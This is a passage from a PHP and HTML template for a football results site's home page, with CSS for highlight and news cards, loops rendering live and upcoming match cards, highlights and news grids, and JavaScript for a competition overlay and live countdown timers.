            transform: translateY(-5px);
            box-shadow: 0 8px 20px var(--shadow-strong);
        }
        .highlight-thumbnail {
            width: 100%;
            height: 150px;
            object-fit: cover;
            display: block;
            border-bottom: 1px solid var(--border-color);
        }
        .highlight-info {
            padding: 12px;
            flex-grow: 1;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
        }
        .highlight-info h3 {
            font-size: 1.1em;
            color: var(--accent-color);
            margin-top: 0;
            margin-bottom: 8px;
            line-height: 1.3;
        }
        .highlight-info p {
            font-size: 0.85em;
            color: var(--text-medium);
            margin-bottom: 10px;
            flex-grow: 1;
        }
        .highlight-play-icon {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-size: 3em;
            color: rgba(255, 255, 255, 0.8);
            text-shadow: 0 0 10px rgba(0,0,0,0.7);
            transition: color 0.3s ease, transform 0.3s ease;
        }
        .highlight-card:hover .highlight-play-icon {
            color: var(--accent-color);
            transform: translate(-50%, -50%) scale(1.1);
        }
        .highlight-duration {
            position: absolute;
            bottom: 8px;
            right: 8px;
            background: rgba(0, 0, 0, 0.7);
            color: #fff;
            padding: 3px 6px;
            border-radius: 4px;
            font-size: 0.7em;
            font-weight: bold;
        }


        /* News Section - FIXES APPLIED */
        .news-section {
            padding: 0 10px;
            margin-top: 40px;
        }
        .news-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); /* Allow multiple columns on larger screens */
            gap: 15px; /* Standard gap */
            margin-top: 15px;
        }

        .news-grid.news-listing-page {
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); /* Adjust for listing page if needed */
        }

        .news-article-card {
            background: var(--bg-light);
            border-radius: 8px;
            overflow: hidden; /* Ensure image corners are rounded */
            text-decoration: none;
            color: inherit;
            box-shadow: 0 4px 12px var(--shadow-medium);
            transition: transform 0.2s ease-out, box-shadow 0.2s ease-out;
            display: flex;
            flex-direction: column; /* Stack image on top of info */
            border: 1px solid #2a2a2a;
        }
        .news-article-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 8px 20px var(--shadow-strong);
        }
        .news-thumbnail {
            width: 100%; /* Image takes full width of card */
            height: 180px; /* Fixed height for consistency */
            object-fit: cover;
            display: block;
            border-bottom: 1px solid var(--border-color); /* Separator below image */
        }
        .news-info {
            padding: 15px; /* More padding */
            flex-grow: 1;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
        }
        .news-info h3 {
            font-size: 1.2em; /* Slightly larger heading */
            color: var(--accent-color);
            margin-top: 0;
            margin-bottom: 8px;
            line-height: 1.3;
            overflow: hidden;
            text-overflow: ellipsis;
            display: -webkit-box;
            -webkit-line-clamp: 2; /* Limit to 2 lines */
            -webkit-box-orient: vertical;
        }
        .news-info p {
            font-size: 0.9em; /* Standard paragraph size */
            color: var(--text-medium);
            margin-bottom: 10px;
            flex-grow: 1;
            overflow: hidden;
            text-overflow: ellipsis;
            display: -webkit-box;
            -webkit-line-clamp: 3; /* Limit to 3 lines */
            -webkit-box-orient: vertical;
        }
        /* New separator for news articles */
        .news-separator {
            border: none;
            border-top: 1px solid var(--border-color);
            margin: 10px 0; /* Adjust margin as needed */
        }
        .news-meta {
            font-size: 0.8em; /* Standard meta text size */
            color: var(--text-dark);
            margin-top: auto; /* Pushes the date to the bottom */
            text-align: right; /* Aligns date to the right */
        }
        /* Styling for content within the .news-info p tag (if HTML is present) */
        .news-info p >>> * { /* Target children of p inside news-info */
            margin: 0;
            padding: 0;
            line-height: 1.4;
            font-size: 0.9em; /* Ensure consistent font size for paragraph content */
        }
        .news-info p >>> p {
            margin-bottom: 0.5em; /* Add some margin between paragraphs if content has multiple <p> */
        }
        .news-info p >>> a {
            color: var(--accent-color); /* Style links within the description */
            text-decoration: underline;
        }
    </style>
</head>
<body>

<div class="container">
    <div class="country-bar">
        <div class="countries">
            <?php foreach ($countries as $country): ?>
                <div class="country" onclick="openCompOverlay('<?= htmlspecialchars($country['name']) ?>', <?= htmlspecialchars(json_encode($country['comps'])) ?>)">
                    <img src="<?= htmlspecialchars($country['icon']) ?>" alt="<?= htmlspecialchars($country['name']) ?> icon" class="country-icon">
                    <span class="country-name"><?= htmlspecialchars($country['name']) ?></span>
                </div>
            <?php endforeach; ?>
        </div>
    </div>

    <div id="comp-overlay">
        <div class="overlay-content">
            <span class="close-btn" onclick="closeCompOverlay()">×</span>
            <h3 id="overlay-country-name"></h3>
            <div id="overlay-competitions">
                </div>
            <?php if (empty($countries)): ?>
                <p style="color:var(--text-dark);">No countries or competitions available.</p>
            <?php endif; ?>
        </div>
    </div>

    <?php if (empty($sorted)): ?>
        <p style="text-align: center; color: var(--text-medium); margin-top: 50px;">No live or upcoming matches at the moment. Check back later!</p>
    <?php else: ?>
        <?php foreach ($sorted as $league): ?>
            <div class="league-container">
                <div class="section-header">
                    <h2>
                        <?= htmlspecialchars($league['name']) ?>
                        <?php if ($league['live'] > 0): ?>
                            <span style="background:#28a745; color:#fff; padding:3px 8px; border-radius:15px; font-size:0.7em; margin-left:8px;"><?= $league['live'] ?> LIVE</span>
                        <?php endif; ?>
                    </h2>
                    <a href="/competition/<?= htmlspecialchars($league['slug']) ?>" class="view-all-link">View All <i class="fas fa-chevron-right"></i></a>
                </div>
                <div class="cards">
                    <?php foreach ($league['matches'] as $match): // This loop now only goes through the limited 8 matches
                        $status_class = '';
                        $display_status = '';
                        // Pass match date to JS via data attribute for reliable countdown
                        $match_date_attr = (new DateTime($match['match_date']))->format('Y-m-d');

                        $match_datetime = new DateTime($match['match_date'] . ' ' . $match['match_time']);
                        $now = new DateTime();

                        if ($match['status'] === 'live') {
                            $status_class = 'live';
                            $display_status = 'LIVE';
                        } elseif ($match['status'] === 'countdown') {
                            $status_class = 'countdown';
                            $interval = $now->diff($match_datetime);
                            // This logic is for display, the SQL already filtered for future/current.
                            if ($interval->invert) { // Match date/time has passed relative to now
                                $status_class = 'finished'; // This should ideally not happen if SQL is correct
                                $display_status = 'FINISHED';
                            } elseif ($interval->days > 0) {
                                $display_status = $interval->format('%a DAYS');
                            } else {
                                $display_status = $interval->format('%H:%I:%S');
                            }
                        } else { // Fallback for any other status, treat as finished if not live/countdown
                            $status_class = 'finished';
                            $display_status = 'FINISHED';
                        }

                        // Construct the clean season slug for the URL
                        $url_season_name = str_replace('/', '-', htmlspecialchars($match['season_name'] ?? ''));

                        // Construct the full match slug with date
                        $full_match_slug_with_date = htmlspecialchars($match['home_slug'] ?? '') . '-vs-' . htmlspecialchars($match['away_slug'] ?? '') . '-' . (new DateTime($match['match_date']))->format('Y-m-d');

                        // Construct the match URL
                        $match_url = '/' . htmlspecialchars($match['comp_slug'] ?? '') . '/' . $url_season_name . '/' . $full_match_slug_with_date;
                    ?>
                        <a href="<?= htmlspecialchars($match_url) ?>" class="card" data-match-date="<?= $match_date_attr ?>"> <div class="card-header">
                                <span><?= (new DateTime($match['match_time']))->format('H:i') ?> EAT</span>
                                <span class="status <?= $status_class ?>"><?= $display_status ?></span>
                            </div>
                            <div class="card-body">
                                <div class="team">
                                    <img src="<?= adjustDisplayPath($match['home_icon']) ?>" alt="<?= htmlspecialchars($match['home_name']) ?>">
                                    <span><?= htmlspecialchars($match['home_name']) ?></span>
                                </div>
                                <?php if ($match['status'] === 'finished'): ?>
                                    <span class="score"><?= htmlspecialchars($match['home_score']) ?></span>
                                    <span class="vs">-</span>
                                    <span class="score"><?= htmlspecialchars($match['away_score']) ?></span>
                                <?php else: ?>
                                    <span class="vs">vs</span>
                                <?php endif; ?>
                                <div class="team">
                                    <img src="<?= adjustDisplayPath($match['away_icon']) ?>" alt="<?= htmlspecialchars($match['away_name']) ?>">
                                    <span><?= htmlspecialchars($match['away_name']) ?></span>
                                </div>
                            </div>
                        </a>
                    <?php endforeach; ?>
                </div>
            </div>
            <hr class="thin-separator">
        <?php endforeach; ?>
    <?php endif; ?>

    <div class="highlights-section">
        <div class="section-header">
            <h2>Latest Highlights</h2>
            <a href="/highlights" class="view-all-link">View All <i class="fas fa-chevron-right"></i></a>
        </div>
        <?php if (empty($highlights)): ?>
            <p style="color:var(--text-dark); text-align: center; margin-top: 20px;">No highlights available yet.</p>
        <?php else: ?>
            <div class="highlight-grid">
                <?php foreach ($highlights as $h): ?>
                    <a href="<?= htmlspecialchars($h['highlight_url']) ?>" class="highlight-card">
                        <div style="position: relative;">
                            <img src="<?= htmlspecialchars($h['thumbnail_url'] ?: 'https://placehold.co/600x337/333/fff?text=No+Thumbnail') ?>" alt="<?= htmlspecialchars($h['title'] ?? '') ?>" class="highlight-thumbnail">
                            <span class="highlight-duration"><?= htmlspecialchars($h['duration'] ?? 'N/A') ?></span>
                            <i class="fas fa-play-circle highlight-play-icon"></i>
                        </div>
                        <div class="highlight-info">
                            <h3><?= htmlspecialchars($h['title'] ?? 'No Title') ?></h3>
                            <p><?= htmlspecialchars($h['description'] ?? 'No description available.') ?></p>
                            <div class="highlight-meta">
                                <span><?= (new DateTime($h['created_at']))->format('M j, Y') ?></span>
                            </div>
                        </div>
                    </a>
                <?php endforeach; ?>
            </div>
        <?php endif; ?>
    </div>

    <div class="news-section">
        <div class="section-header">
            <h2>News</h2>
            <a href="/news" class="view-all-link">View All <i class="fas fa-chevron-right"></i></a>
        </div>
        <?php if (empty($news_articles)): ?>
            <p style="color:var(--text-dark); text-align: center; margin-top: 20px;">No news articles available yet.</p>
        <?php else: ?>
            <div class="news-grid">
                <?php foreach ($news_articles as $article): ?>
                    <a href="/article/<?= htmlspecialchars($article['slug']) ?>" class="news-article-card">
                        <?php if (!empty($article['image'])): ?>
                            <img src="<?= htmlspecialchars($article['image']) ?>" alt="<?= htmlspecialchars($article['title'] ?? '') ?>" class="news-thumbnail">
                        <?php endif; ?>
                        <div class="news-info">
                            <h3><?= htmlspecialchars($article['title'] ?? 'Untitled Article') ?></h3>
                            <p><?= cleanAndDisplayHtml(mb_substr($article['content'] ?? '', 0, 100, 'UTF-8')) ?>...</p>
                            <hr class="news-separator"> <div class="news-meta">
                                <span><?= (new DateTime($article['created_at']))->format('M j, Y') ?></span>
                            </div>
                        </div>
                    </a>
                <?php endforeach; ?>
            </div>
        <?php endif; ?>
    </div>

</div>

<script>
    // JavaScript for Competition Overlay
    function openCompOverlay(countryName, competitions) {
        document.getElementById('overlay-country-name').innerText = countryName;
        const compListDiv = document.getElementById('overlay-competitions');
        compListDiv.innerHTML = ''; // Clear previous competitions

        if (competitions.length > 0) {
            competitions.forEach(comp => {
                const compLink = document.createElement('a');
                compLink.href = `/competition/${comp.slug}`; // Direct link to competition page
                compLink.innerText = comp.name;
                compListDiv.appendChild(compLink);
            });
        } else {
            compListDiv.innerHTML = '<p style="color:var(--text-medium); font-style: italic;">No competitions found for this country.</p>';
        }
        document.getElementById('comp-overlay').style.display = 'flex';
    }

    function closeCompOverlay() {
        document.getElementById('comp-overlay').style.display = 'none';
    }

    // Close overlay if clicked outside content
    window.onclick = function(event) {
        const overlay = document.getElementById('comp-overlay');
        if (event.target == overlay) {
            overlay.style.display = 'none';
        }
    }

    // Dynamic countdowns for live/upcoming matches
    function updateCountdowns() {
        document.querySelectorAll('.status.countdown').forEach(span => {
            const card = span.closest('.card');
            if (!card) return;

            const timeStr = card.querySelector('.card-header span:first-child').innerText; // e.g., "15:00 EAT"
            const matchDateFromData = card.dataset.matchDate; // e.g., "2025-06-02"

            let matchDateTime;

            if (matchDateFromData) {
                const timeParts = timeStr.match(/(\d{2}):(\d{2})/);
                if (timeParts) {
                    const hours = parseInt(timeParts[1]);
                    const minutes = parseInt(timeParts[2]);
                    // Construct Date object using parsed date and time
                    matchDateTime = new Date(`${matchDateFromData}T${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}:00`);
                } else {
                    // Fallback if time parsing fails, use match date with default time (00:00:00)
                    matchDateTime = new Date(`${matchDateFromData}T00:00:00`);
                }
            } else {
                // Should not happen if data-match-date is always set correctly
                span.innerText = 'UPCOMING';
                return;
            }

            const now = new Date();
            const diffMs = matchDateTime.getTime() - now.getTime();

            if (diffMs <= 0) {
                span.innerText = 'FINISHED'; // Match date/time has passed
                span.classList.remove('countdown');
                span.classList.add('finished');
                // You might want to re-render the score here if it was a finished match
                // but the status was 'countdown' until just now. This is more complex
                // as it requires fetching the score or having it pre-loaded.
                return;
            }

            const days = Math.floor(diffMs / (1000 * 60 * 60 * 24));
            const hours = Math.floor((diffMs % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
            const minutes = Math.floor((diffMs % (1000 * 60 * 60)) / (1000 * 60));
            const seconds = Math.floor((diffMs % (1000 * 60)) / 1000);

            if (days > 0) {
                span.innerText = `${days} DAYS`;
            } else {
                span.innerText = `${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
            }
        });
    }

    // Update countdowns every second
    setInterval(updateCountdowns, 1000);
    // Run once on load to initialize
    updateCountdowns();
</script>

<?php include 'includes/footer.php'; ?>
</body>
</html>e);
